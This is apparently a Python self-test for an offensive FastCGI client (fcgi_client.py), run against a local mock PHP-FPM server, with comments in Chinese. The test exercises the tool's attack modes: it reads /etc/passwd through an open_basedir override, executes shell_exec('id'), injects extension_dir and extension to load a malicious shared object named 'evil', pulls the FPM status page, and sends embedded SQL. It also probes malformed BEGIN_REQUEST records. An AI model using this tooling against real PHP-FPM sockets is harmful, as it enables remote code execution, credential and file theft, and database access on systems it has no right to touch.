#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""端到端自测：fcgi_client.py  <->  mock_fpm.py（含 7 字节 BEGIN body 反例）"""
import socket, struct, subprocess, sys, time, os, base64

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET = "unix://" + os.path.join(HERE, "mock.sock").replace("\\", "/")
USE_UNIX = hasattr(socket, "AF_UNIX")
if not USE_UNIX:
    TARGET = "127.0.0.1:19000"

srv = subprocess.Popen([sys.executable, os.path.join(HERE, "mock_fpm.py"), TARGET],
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                       encoding="utf-8", errors="replace")
time.sleep(1.5)


def cli(*args):
    p = subprocess.run([sys.executable, os.path.join(HERE, "fcgi_client.py"), *args, "--target", TARGET],
                       capture_output=True, text=True, timeout=40,
                       encoding="utf-8", errors="replace")
    return (p.stdout or "").strip(), (p.stderr or "").strip()


def raw7byte_test():
    """反例：BEGIN_REQUEST body 只有 7 字节（pack('nC5',1,0,0,0,0,0,0)）→ FPM/模拟器应判非法"""
    body7 = struct.pack(">BBBBBBB", 0, 1, 0, 0, 0, 0, 0)          # 7 字节
    body8 = struct.pack(">BBB5s", 0, 1, 0, b"\x00" * 5)           # 8 字节 = pack('nCx5',1,0)
    assert len(body7) == 7 and len(body8) == 8
    out = []
    for tag, body in (("7字节", body7), ("8字节", body8)):
        s = socket.socket(socket.AF_UNIX if USE_UNIX else socket.AF_INET)
        s.settimeout(5)
        s.connect(TARGET[len("unix://"):] if USE_UNIX else ("127.0.0.1", 19000))
        pkt = struct.pack(">BBHHBB", 1, 1, 1, len(body), 0, 0) + body
        pkt += struct.pack(">BBHHBB", 1, 4, 1, 0, 0, 0)              # 空 PARAMS
        pkt += struct.pack(">BBHHBB", 1, 5, 1, 0, 0, 0)              # 空 STDIN
        s.sendall(pkt)
        data = b""
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        err = b"".join(data[i + 8:i + 8 + struct.unpack(">BBHHBB", data[i:i + 8])[3]]
                       for i in range(0, len(data), 8) if data[i + 1:i + 2] == b"\x07")
        out.append((tag, err.decode("utf-8", "replace").strip() or data[:60]))
    return out


print("=== 1) probe（找可用 SCRIPT_FILENAME） ===")
o, e = cli("probe", "--script", "/var/www/html/index.php"); print(o, e)
print("\n=== 2) read /etc/passwd（open_basedir=/ 覆盖是否生效） ===")
o, e = cli("read", "--script", "/var/www/html/index.php", "--path", "/etc/passwd"); print(o, e)
print("\n=== 3) exec 'id' ===")
o, e = cli("exec", "--script", "/var/www/html/index.php", "--code", "echo shell_exec('id');"); print(o, e)
print("\n=== 4) ext 模式（extension_dir + extension 注入） ===")
o, e = cli("ext", "--script", "/var/www/html/index.php", "--so-dir", "/tmp", "--so-name", "evil", "--code", "evil_cmd('id');"); print(o, e)
print("\n=== 5) status（FPM 状态页） ===")
o, e = cli("status", "--script", "/var/www/html/index.php"); print(o, e)
print("\n=== 6) limit_extensions 拒绝路径（不存在的脚本） ===")
o, e = cli("read", "--script", "/tmp/nope.php", "--path", "/etc/passwd"); print(o, e)
print("\n=== 7) BEGIN_REQUEST body 长度反例（7 字节 vs 8 字节） ===")
for tag, r in raw7byte_test():
    print(f"  {tag}: {r}")

print("\n=== 8) db 模式（内嵌 SQL 是否随 STDIN 下发） ===")
o, e = cli("db", "--script", "/var/www/html/index.php", "--dbn", "phpv4", "--dbu", "u", "--dbp", "p",
           "--sql-b64", base64.b64encode(b"SELECT * FROM users LIMIT 1").decode())
hit = "SELECT * FROM users LIMIT 1" in o or "U0VMRUNUI" in o
print("sql 已下发:", hit)
print(o[:400])

srv.terminate()
time.sleep(0.3)
try:
    print("\n[server log]\n" + srv.stdout.read())
except Exception:
    pass
